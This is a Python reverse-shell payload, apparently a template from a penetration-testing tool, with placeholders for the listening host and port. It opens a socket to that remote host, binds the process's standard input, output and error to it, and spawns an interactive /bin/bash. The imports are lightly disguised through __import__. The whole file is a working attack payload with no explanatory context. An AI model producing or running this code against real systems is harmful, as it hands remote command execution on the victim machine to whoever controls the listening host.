os = __import__("os")
socket = __import__("socket")
pty = __import__("pty")

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("{{datastore.lhost}}", {{datastore.lport}}))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
pty.spawn("/bin/bash")